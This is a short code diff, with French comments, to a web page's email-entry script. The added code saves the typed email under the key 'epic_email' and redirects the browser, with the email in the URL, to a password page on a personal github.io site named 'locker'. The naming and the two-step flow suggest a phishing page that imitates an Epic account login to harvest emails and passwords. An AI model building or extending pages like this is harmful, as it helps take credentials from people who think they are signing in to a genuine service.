@@ -506,6 +506,9 @@
 
   if (!emailInput || !errorEl) return;
 
+  /* URL de la page de mot de passe */
+  const PASSWORD_PAGE_URL = 'https://hesskahmdl.github.io/locker/login.html/passwords.html';
+
   function isValidEmail(value) {
     if (!value) return false;
     if (!value.includes('@')) return false;
@@ -566,7 +569,24 @@
     }
 
     hideError();
+
+    /* Sauvegarde l'email dans le localStorage pour la page suivante */
+    try {
+      localStorage.setItem('epic_email', value);
+    } catch (err) { /* ignore */ }
+
+    /* Redirection vers la page de mot de passe avec l'email en paramètre */
+    window.location.href = PASSWORD_PAGE_URL + '?email=' + encodeURIComponent(value);
   });
+
+  /* Permet aussi de valider avec la touche Entrée */
+  emailInput.addEventListener('keydown', function (e) {
+    if (e.key === 'Enter') {
+      e.preventDefault();
+      continueBtn.click();
+    }
+  });
+
 })();
 </script>
 
